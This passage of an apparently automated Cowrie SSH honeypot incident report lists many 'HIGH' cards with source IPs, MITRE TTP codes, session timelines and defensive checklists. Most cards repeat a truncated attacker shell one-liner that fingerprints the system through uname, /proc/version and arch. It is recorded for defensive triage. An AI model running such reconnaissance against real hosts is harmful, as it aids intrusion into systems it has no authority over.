| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:13:11` | `cowrie.session.connect` |
| `2026-09-06 07:13:11` | `cowrie.client.version` |
| `2026-09-06 07:13:11` | `cowrie.client.kex` |
| `2026-09-06 07:13:14` | `cowrie.login.success` |
| `2026-09-06 07:13:16` | `cowrie.session.params` |
| `2026-09-06 07:13:16` | `cowrie.command.input` |
| `2026-09-06 07:13:16` | `cowrie.log.closed` |
| `2026-09-06 07:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0607312c3e3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:15 |
| **Last Seen** | 2026-09-06 07:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:15:49` | `cowrie.session.connect` |
| `2026-09-06 07:15:50` | `cowrie.client.version` |
| `2026-09-06 07:15:50` | `cowrie.client.kex` |
| `2026-09-06 07:15:54` | `cowrie.login.success` |
| `2026-09-06 07:15:56` | `cowrie.session.params` |
| `2026-09-06 07:15:56` | `cowrie.command.input` |
| `2026-09-06 07:15:56` | `cowrie.log.closed` |
| `2026-09-06 07:15:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-580a9da6656e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:18 |
| **Last Seen** | 2026-09-06 07:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:18:24` | `cowrie.session.connect` |
| `2026-09-06 07:18:24` | `cowrie.client.version` |
| `2026-09-06 07:18:24` | `cowrie.client.kex` |
| `2026-09-06 07:18:26` | `cowrie.login.success` |
| `2026-09-06 07:18:28` | `cowrie.session.params` |
| `2026-09-06 07:18:28` | `cowrie.command.input` |
| `2026-09-06 07:18:29` | `cowrie.log.closed` |
| `2026-09-06 07:18:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b443b722d33c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:21 |
| **Last Seen** | 2026-09-06 07:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:21:17` | `cowrie.session.connect` |
| `2026-09-06 07:21:17` | `cowrie.client.version` |
| `2026-09-06 07:21:17` | `cowrie.client.kex` |
| `2026-09-06 07:21:19` | `cowrie.login.success` |
| `2026-09-06 07:21:20` | `cowrie.session.params` |
| `2026-09-06 07:21:20` | `cowrie.command.input` |
| `2026-09-06 07:21:20` | `cowrie.log.closed` |
| `2026-09-06 07:21:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46a73d20684e

| Field | Detail |
|---|---|
| **Source IP** | `106.12.7[.]70` |
| **First Seen** | 2026-09-06 07:23 |
| **Last Seen** | 2026-09-06 07:28 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:23:56` | `cowrie.session.connect` |
| `2026-09-06 07:23:56` | `cowrie.client.version` |
| `2026-09-06 07:23:56` | `cowrie.client.kex` |
| `2026-09-06 07:23:58` | `cowrie.login.success` |
| `2026-09-06 07:28:58` | `cowrie.session.file_upload` |
| `2026-09-06 07:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.12.7[.]70` to AbuseIPDB if not already reported
- [ ] Block `106.12.7[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb87e385a42c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:24 |
| **Last Seen** | 2026-09-06 07:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:24:45` | `cowrie.session.connect` |
| `2026-09-06 07:24:46` | `cowrie.client.version` |
| `2026-09-06 07:24:46` | `cowrie.client.kex` |
| `2026-09-06 07:24:47` | `cowrie.login.success` |
| `2026-09-06 07:24:49` | `cowrie.session.params` |
| `2026-09-06 07:24:49` | `cowrie.command.input` |
| `2026-09-06 07:24:49` | `cowrie.log.closed` |
| `2026-09-06 07:24:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0b9a63462bc

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:27 |
| **Last Seen** | 2026-09-06 07:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:27:21` | `cowrie.session.connect` |
| `2026-09-06 07:27:22` | `cowrie.client.version` |
| `2026-09-06 07:27:22` | `cowrie.client.kex` |
| `2026-09-06 07:27:23` | `cowrie.login.success` |
| `2026-09-06 07:27:26` | `cowrie.session.params` |
| `2026-09-06 07:27:26` | `cowrie.command.input` |
| `2026-09-06 07:27:27` | `cowrie.log.closed` |
| `2026-09-06 07:27:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-392e405d015d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:29 |
| **Last Seen** | 2026-09-06 07:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:29:52` | `cowrie.session.connect` |
| `2026-09-06 07:29:52` | `cowrie.client.version` |
| `2026-09-06 07:29:52` | `cowrie.client.kex` |
| `2026-09-06 07:29:55` | `cowrie.login.success` |
| `2026-09-06 07:29:56` | `cowrie.session.params` |
| `2026-09-06 07:29:56` | `cowrie.command.input` |
| `2026-09-06 07:29:57` | `cowrie.log.closed` |
| `2026-09-06 07:29:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88d385b80666

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:32 |
| **Last Seen** | 2026-09-06 07:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:32:21` | `cowrie.session.connect` |
| `2026-09-06 07:32:21` | `cowrie.client.version` |
| `2026-09-06 07:32:25` | `cowrie.client.kex` |
| `2026-09-06 07:32:27` | `cowrie.login.success` |
| `2026-09-06 07:32:28` | `cowrie.session.params` |
| `2026-09-06 07:32:28` | `cowrie.command.input` |
| `2026-09-06 07:32:29` | `cowrie.log.closed` |
| `2026-09-06 07:32:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6ef67465858

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:34 |
| **Last Seen** | 2026-09-06 07:35 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:34:56` | `cowrie.session.connect` |
| `2026-09-06 07:34:57` | `cowrie.client.version` |
| `2026-09-06 07:34:57` | `cowrie.client.kex` |
| `2026-09-06 07:35:02` | `cowrie.login.success` |
| `2026-09-06 07:35:04` | `cowrie.session.params` |
| `2026-09-06 07:35:04` | `cowrie.command.input` |
| `2026-09-06 07:35:05` | `cowrie.log.closed` |
| `2026-09-06 07:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bbddb45f7fd

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:37 |
| **Last Seen** | 2026-09-06 07:37 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:37:31` | `cowrie.session.connect` |
| `2026-09-06 07:37:33` | `cowrie.client.version` |
| `2026-09-06 07:37:33` | `cowrie.client.kex` |
| `2026-09-06 07:37:37` | `cowrie.login.success` |
| `2026-09-06 07:37:41` | `cowrie.session.params` |
| `2026-09-06 07:37:41` | `cowrie.command.input` |
| `2026-09-06 07:37:42` | `cowrie.log.closed` |
| `2026-09-06 07:37:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dc0a080490f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:39 |
| **Last Seen** | 2026-09-06 07:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:39:43` | `cowrie.session.connect` |
| `2026-09-06 07:39:44` | `cowrie.client.version` |
| `2026-09-06 07:39:44` | `cowrie.client.kex` |
| `2026-09-06 07:39:48` | `cowrie.login.success` |
| `2026-09-06 07:39:51` | `cowrie.session.params` |
| `2026-09-06 07:39:51` | `cowrie.command.input` |
| `2026-09-06 07:39:51` | `cowrie.log.closed` |
| `2026-09-06 07:39:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec630dc640d0

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:42 |
| **Last Seen** | 2026-09-06 07:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:42:06` | `cowrie.session.connect` |
| `2026-09-06 07:42:07` | `cowrie.client.version` |
| `2026-09-06 07:42:07` | `cowrie.client.kex` |
| `2026-09-06 07:42:10` | `cowrie.login.success` |
| `2026-09-06 07:42:12` | `cowrie.session.params` |
| `2026-09-06 07:42:12` | `cowrie.command.input` |
| `2026-09-06 07:42:14` | `cowrie.log.closed` |
| `2026-09-06 07:42:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44e0a2eacc31

| Field | Detail |
|---|---|
| **Source IP** | `34.38.138[.]175` |
| **First Seen** | 2026-09-06 07:43 |
| **Last Seen** | 2026-09-06 07:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:43:05` | `cowrie.session.connect` |
| `2026-09-06 07:43:05` | `cowrie.login.success` |
| `2026-09-06 07:43:05` | `cowrie.session.params` |
| `2026-09-06 07:43:05` | `cowrie.command.input` |
| `2026-09-06 07:43:05` | `cowrie.command.input` |
| `2026-09-06 07:43:05` | `cowrie.command.failed` |
| `2026-09-06 07:43:05` | `cowrie.command.input` |
| `2026-09-06 07:43:05` | `cowrie.log.closed` |
| `2026-09-06 07:43:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.38.138[.]175` to AbuseIPDB if not already reported
- [ ] Block `34.38.138[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c527ddd2b6a8

| Field | Detail |
|---|---|
| **Source IP** | `34.38.138[.]175` |
| **First Seen** | 2026-09-06 07:43 |
| **Last Seen** | 2026-09-06 07:43 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:43:18` | `cowrie.session.connect` |
| `2026-09-06 07:43:18` | `cowrie.login.success` |
| `2026-09-06 07:43:19` | `cowrie.session.params` |
| `2026-09-06 07:43:19` | `cowrie.command.input` |
| `2026-09-06 07:43:19` | `cowrie.command.failed` |
| `2026-09-06 07:43:35` | `cowrie.log.closed` |
| `2026-09-06 07:43:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.38.138[.]175` to AbuseIPDB if not already reported
- [ ] Block `34.38.138[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c242f77b75d4

| Field | Detail |
|---|---|
| **Source IP** | `34.38.138[.]175` |
| **First Seen** | 2026-09-06 07:43 |
| **Last Seen** | 2026-09-06 07:43 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:43:20` | `cowrie.session.connect` |
| `2026-09-06 07:43:20` | `cowrie.login.success` |
| `2026-09-06 07:43:21` | `cowrie.session.params` |
| `2026-09-06 07:43:21` | `cowrie.command.input` |
| `2026-09-06 07:43:35` | `cowrie.log.closed` |
| `2026-09-06 07:43:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.38.138[.]175` to AbuseIPDB if not already reported
- [ ] Block `34.38.138[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bfe6e4bdce9

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:44 |
| **Last Seen** | 2026-09-06 07:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:44:22` | `cowrie.session.connect` |
| `2026-09-06 07:44:23` | `cowrie.client.version` |
| `2026-09-06 07:44:23` | `cowrie.client.kex` |
| `2026-09-06 07:44:26` | `cowrie.login.success` |
| `2026-09-06 07:44:28` | `cowrie.session.params` |
| `2026-09-06 07:44:28` | `cowrie.command.input` |
| `2026-09-06 07:44:29` | `cowrie.log.closed` |
| `2026-09-06 07:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f260f47edfd3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:46 |
| **Last Seen** | 2026-09-06 07:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:46:47` | `cowrie.session.connect` |
| `2026-09-06 07:46:48` | `cowrie.client.version` |
| `2026-09-06 07:46:48` | `cowrie.client.kex` |
| `2026-09-06 07:46:51` | `cowrie.login.success` |
| `2026-09-06 07:46:53` | `cowrie.session.params` |
| `2026-09-06 07:46:53` | `cowrie.command.input` |
| `2026-09-06 07:46:54` | `cowrie.log.closed` |
| `2026-09-06 07:46:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3423ed124b97

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:49 |
| **Last Seen** | 2026-09-06 07:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
